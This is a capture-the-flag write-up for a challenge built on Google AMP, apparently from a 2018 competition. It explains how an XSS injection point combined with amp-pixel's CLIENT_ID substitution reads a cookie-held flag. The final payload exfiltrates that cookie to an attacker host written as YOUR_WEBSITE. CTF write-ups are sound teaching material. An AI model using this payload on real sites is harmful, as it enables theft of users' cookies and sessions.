AMP
==================================
## Challenge (22 solved)

Building the future web, together.

## Writeup

It's very easy to know XSS here: http://amp.2018.teamrois.cn/?name=XSS_HERE, and we know the flag is hidden in the cookie. The page is built with [Google AMP](https://www.ampproject.org), you can do [script gadgets](https://github.com/google/security-research-pocs/tree/master/script-gadgets) to bypass CSP(Some teams found), but it's unnecessary.

Because no components were imported into the page, so we have only 3 built-in components: ``<amp-pixel>``, ``<amp-img>`` and ``<amp-layout>``. The [document](https://www.ampproject.org/docs/reference/components/amp-pixel) said
>The amp-pixel allows all standard URL variable substitutions. See the [Substitutions Guide](https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md) for more information.

Now let's go to _Substitutions Guide_. It's easy to know there's a ``CLIENT_ID`` can track a user, and the example is:
```html
<amp-pixel src="https://foo.com/pixel?cid=CLIENT_ID(cid-scope-cookie-fallback-name)"></amp-pixel>
```

The argument ``cid-scope-cookie-fallback-name`` means :
> The name of the fallback cookie when the document is not served by an AMP proxy. If not provided, cid scope will be used as the cookie name.

Now we can read the cookie. Payload:
```html
<amp-pixel src="https://YOUR_WEBSITE/?cid=CLIENT_ID(FLAG)"></amp-pixel>
```
